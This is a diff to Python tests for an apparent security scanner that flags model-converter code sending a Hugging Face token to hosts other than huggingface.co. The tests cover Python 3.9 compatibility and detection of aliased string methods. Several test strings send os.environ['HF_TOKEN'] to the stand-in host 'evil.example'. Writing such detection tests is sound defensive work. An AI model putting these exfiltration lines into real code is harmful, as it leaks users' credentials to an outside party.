@@ -4520,6 +4520,8 @@ def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
     ) == []
 
     import ast as ast_module
+    if sys.version_info < (3, 10):
+        return                          # no match statement to parse at all
     captured = ast_module.parse(
         'HOST = "https://huggingface.co"\n'
         'match pair:\n'
@@ -4530,6 +4532,58 @@ def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
     assert "HOST" in module._single_assignments(
         ast_module.parse('HOST = "https://huggingface.co"\n')
     )
+
+
+def test_the_allowance_runs_where_the_match_statement_does_not_exist():
+    """The package supports Python 3.9, where ast.MatchAs does not exist.
+
+    Reaching for it per node raised AttributeError there, the allowance caught
+    it and refused, and the honest converter produced a CRITICAL finding on 3.9
+    alone. The classes are named once at import instead, and isinstance against
+    an empty tuple is simply False.
+    """
+    import ast as ast_module
+
+    removed = {}
+    for name in ("MatchAs", "MatchStar", "MatchMapping"):
+        if hasattr(ast_module, name):
+            removed[name] = getattr(ast_module, name)
+            delattr(ast_module, name)
+    try:
+        module = _load(
+            "converter_scan_no_match_probe", "unsloth_zoo/converter_scan.py",
+        )
+        assert module.MATCH_CAPTURES == ()
+        assert module.scan_converter_source(
+            'import os\nimport requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+        ) == []
+    finally:
+        for name, value in removed.items():
+            setattr(ast_module, name, value)
+
+
+def test_a_descriptor_bound_to_a_name_is_still_that_method():
+    """r = str.replace then r(HUB, "huggingface.co", "evil.example") is the
+    same rewrite with the method behind a name, which no rule that reads a call
+    site could see. A single assignment of a descriptor is followed the way an
+    import alias is.
+    """
+    scan_converter_source = _load(
+        "converter_scan_descriptor_alias_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    token = 'headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'r = str.replace\n'
+        'requests.get(r(HUB, "huggingface.co", "evil.example"), ' + token,
+        'f = str.format\n'
+        'requests.get(f("{}://{}", "https", "evil.example"), ' + token,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    assert scan_converter_source(preamble + 'requests.get(HUB, ' + token) == []
 
 
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
